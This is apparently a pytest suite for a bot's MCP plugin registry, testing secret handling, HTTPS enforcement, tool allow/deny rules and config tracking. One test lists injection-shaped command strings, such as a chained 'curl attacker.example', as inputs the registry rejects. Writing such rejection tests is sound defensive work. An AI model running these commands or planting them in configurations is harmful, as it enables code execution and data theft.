from __future__ import annotations

import json

import pytest

from kiro_bot.plugins import (
    PluginRegistry,
    PluginRegistryError,
    SecretResolutionError,
)
from kiro_bot.store import Bot, Store


def registry(tmp_path) -> PluginRegistry:
    store = Store(tmp_path)
    store.put_bot(Bot(name="builder", cwd=str(tmp_path)))
    return PluginRegistry(store)


def test_stdio_compilation_resolves_references_only_at_launch(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="github",
        name="GitHub MCP",
        transport="stdio",
        command="npx",
        args=["-y", "@example/github-mcp"],
        env={"GITHUB_TOKEN": "env:TEST_GITHUB_TOKEN"},
    )
    plugins.bind_plugin(
        "builder",
        "github",
        allow_tools=["read_issue", "close_issue"],
        deny_tools=["close_issue"],
        auto_approve_tools=["read_issue"],
        timeout_ms=45_000,
    )

    # Persistence and summaries contain only the reference.
    on_disk = plugins.require_plugin("github")
    assert on_disk.env == {"GITHUB_TOKEN": "env:TEST_GITHUB_TOKEN"}
    assert "launch-secret" not in json.dumps(on_disk.summary())

    servers = plugins.compile_session_servers(
        "builder", environ={"TEST_GITHUB_TOKEN": "launch-secret"}
    )
    assert servers == [
        {
            "name": "github",
            "type": "stdio",
            "command": "npx",
            "args": ["-y", "@example/github-mcp"],
            "env": [{"name": "GITHUB_TOKEN", "value": "launch-secret"}],
            "disabledTools": ["close_issue"],
            "timeout": 45_000,
        }
    ]
    assert plugins.tool_auto_approved("builder", "github", "read_issue") is True


def test_http_compilation_requires_https_except_localhost(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="remote-search",
        name="Remote Search",
        transport="http",
        url="https://mcp.example.com/v1/mcp",
    )
    plugins.create_plugin(
        plugin_id="local-dev",
        name="Local Dev",
        transport="http",
        url="http://127.0.0.1:8123/mcp",
    )
    plugins.bind_plugin("builder", "remote-search")
    plugins.bind_plugin("builder", "local-dev", timeout_ms=5_000)

    assert plugins.compile_session_servers("builder", environ={}) == [
        {
            "name": "local-dev",
            "type": "http",
            "url": "http://127.0.0.1:8123/mcp",
            "timeout": 5_000,
        },
        {
            "name": "remote-search",
            "type": "http",
            "url": "https://mcp.example.com/v1/mcp",
            "timeout": 60_000,
        },
    ]

    with pytest.raises(PluginRegistryError, match="require HTTPS"):
        plugins.create_plugin(
            plugin_id="insecure",
            name="Insecure",
            transport="http",
            url="http://mcp.example.com/mcp",
        )


def test_missing_secret_fails_closed_without_a_partial_server_list(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="needs-secret",
        name="Needs Secret",
        transport="stdio",
        command="node",
        args=["server.js"],
        env={"API_TOKEN": "env:MISSING_TOKEN"},
    )
    plugins.bind_plugin("builder", "needs-secret")

    with pytest.raises(SecretResolutionError, match="MISSING_TOKEN"):
        plugins.compile_session_servers("builder", environ={})


def test_deny_precedence_and_disabled_bindings(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="files",
        name="Files",
        transport="stdio",
        command="uvx",
        args=["filesystem-mcp"],
    )
    plugins.bind_plugin(
        "builder",
        "files",
        allow_tools=["*"],
        deny_tools=["delete_file"],
    )

    assert plugins.tool_allowed("builder", "files", "read_file") is True
    assert plugins.tool_allowed("builder", "files", "delete_file") is False
    assert plugins.compile_session_servers("builder", environ={})[0]["disabledTools"] == [
        "delete_file"
    ]

    plugins.bind_plugin("builder", "files", enabled=False)
    assert plugins.tool_allowed("builder", "files", "read_file") is False
    assert plugins.compile_session_servers("builder", environ={}) == []


@pytest.mark.parametrize(
    ("allow", "deny", "auto", "message"),
    [
        (["read"], [], ["write"], "included in allow_tools"),
        (["*"], [], ["*"], "wildcards are forbidden"),
        (["read"], ["read"], ["read"], "cannot also be denied"),
        (["read*"], [], [], "invalid tool name"),
    ],
)
def test_invalid_auto_approve_and_wildcards(tmp_path, allow, deny, auto, message) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="tools",
        name="Tools",
        transport="stdio",
        command="tool-server",
    )
    with pytest.raises(PluginRegistryError, match=message):
        plugins.bind_plugin(
            "builder",
            "tools",
            allow_tools=allow,
            deny_tools=deny,
            auto_approve_tools=auto,
        )


@pytest.mark.parametrize(
    "command",
    [
        "npx evil-package; curl attacker.example",
        "bash -c 'curl attacker.example'",
        "sh",
        "../bin/server",
        "node\nmalicious",
    ],
)
def test_injection_shaped_commands_are_rejected(tmp_path, command) -> None:
    plugins = registry(tmp_path)
    with pytest.raises(PluginRegistryError):
        plugins.create_plugin(
            plugin_id="unsafe",
            name="Unsafe",
            transport="stdio",
            command=command,
        )


def test_plaintext_environment_values_and_url_credentials_are_rejected(tmp_path) -> None:
    plugins = registry(tmp_path)
    with pytest.raises(PluginRegistryError, match="inline environment secret"):
        plugins.create_plugin(
            plugin_id="inline",
            name="Inline Secret",
            transport="stdio",
            command="node",
            env={"API_KEY": "test-api-key-value"},
        )
    with pytest.raises(PluginRegistryError, match="credentials are forbidden"):
        plugins.create_plugin(
            plugin_id="url-secret",
            name="URL Secret",
            transport="http",
            url="https://user:password@mcp.example.com/mcp",
        )
    with pytest.raises(PluginRegistryError, match="plaintext secret in args"):
        plugins.create_plugin(
            plugin_id="arg-secret",
            name="Argument Secret",
            transport="stdio",
            command="node",
            args=["server.js", "--api-key=plaintext"],
        )


def test_registry_persists_and_summaries_never_expose_resolved_values(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="durable",
        name="Durable",
        transport="stdio",
        command="node",
        args=["mcp.js"],
        env={"SERVICE_TOKEN": "env:DURABLE_TOKEN"},
    )
    plugins.bind_plugin(
        "builder",
        "durable",
        allow_tools=["inspect"],
        auto_approve_tools=["inspect"],
        timeout_ms=12_000,
    )
    plugins.compile_session_servers("builder", environ={"DURABLE_TOKEN": "never-persist-me"})

    reopened = PluginRegistry(Store(tmp_path))
    assert reopened.require_plugin("durable").command == "node"
    assert reopened.get_binding("builder", "durable").timeout_ms == 12_000  # type: ignore[union-attr]
    summaries = json.dumps(
        {
            "plugins": reopened.plugin_summaries(),
            "bindings": reopened.binding_summaries("builder"),
        },
        sort_keys=True,
    )
    assert "env:DURABLE_TOKEN" in summaries
    assert "never-persist-me" not in summaries


def test_update_list_unbind_and_delete(tmp_path) -> None:
    plugins = registry(tmp_path)
    created = plugins.create_plugin(
        plugin_id="lifecycle",
        name="Lifecycle",
        transport="stdio",
        command="node",
    )
    updated = plugins.update_plugin("lifecycle", name="Lifecycle v2", enabled=False)
    assert updated.name == "Lifecycle v2"
    assert updated.created_at == created.created_at
    assert plugins.list_plugins(enabled_only=True) == []

    plugins.bind_plugin("builder", "lifecycle")
    assert len(plugins.list_bindings("builder")) == 1
    plugins.unbind_plugin("builder", "lifecycle")
    assert plugins.list_bindings("builder") == []
    plugins.delete_plugin("lifecycle")
    assert plugins.get_plugin("lifecycle") is None


def test_plugin_configuration_generation_tracks_every_effective_mutation(tmp_path) -> None:
    plugins = registry(tmp_path)
    assert plugins.config_generation("builder") == 0
    plugins.create_plugin(
        plugin_id="generation",
        name="Generation",
        transport="stdio",
        command="node",
    )
    # An unbound catalog entry cannot change a bot's launch configuration.
    assert plugins.config_generation("builder") == 0
    plugins.bind_plugin("builder", "generation")
    assert plugins.config_generation("builder") == 1
    plugins.update_plugin("generation", args=["server.js"])
    assert plugins.config_generation("builder") == 2
    plugins.unbind_plugin("builder", "generation")
    assert plugins.config_generation("builder") == 3
    plugins.bind_plugin("builder", "generation")
    assert plugins.config_generation("builder") == 4
    plugins.delete_plugin("generation")
    assert plugins.config_generation("builder") == 5


def test_auto_approve_intent_never_reaches_backend_mcp_configuration(tmp_path) -> None:
    plugins = registry(tmp_path)
    plugins.create_plugin(
        plugin_id="guarded",
        name="Guarded",
        transport="stdio",
        command="node",
    )
    plugins.bind_plugin(
        "builder",
        "guarded",
        allow_tools=["read"],
        auto_approve_tools=["read"],
    )
    generation, servers = plugins.compile_session_configuration("builder", environ={})
    assert generation == 1
    assert "autoApprove" not in servers[0]
    assert plugins.tool_auto_approved("builder", "guarded", "read") is True
